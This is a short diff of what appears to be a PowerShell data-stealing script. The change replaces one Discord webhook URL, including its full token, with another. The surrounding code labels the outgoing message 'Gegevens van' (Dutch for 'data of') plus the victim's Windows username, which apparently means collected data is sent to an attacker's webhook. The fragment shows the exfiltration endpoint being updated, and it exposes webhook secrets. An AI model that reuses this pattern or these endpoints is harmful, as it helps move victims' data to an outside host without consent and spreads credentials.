@@ -129,7 +129,7 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
             [string]$text 
         )
         
-        $hookurl = 'https://discord.com/api/webhooks/1156610163462131783/0f1XmHXMhX3kZQcTK4iWg7eCo9SnBh3Vjj9ULk-Dn2iW9U7QKl7dRrc2YBYkpoKPzgTE'
+        $hookurl = 'https://discord.com/api/webhooks/1156861787602436147/rtoA_Id9Yc9TGm7lR9MGWWqfryBBvS9mRpShIdcvBw0AVOzwFvEk-UlOQ3bFRnKbKGad'
         
         $Body = @{
           'username' = "Gegevens van " + $env:username 
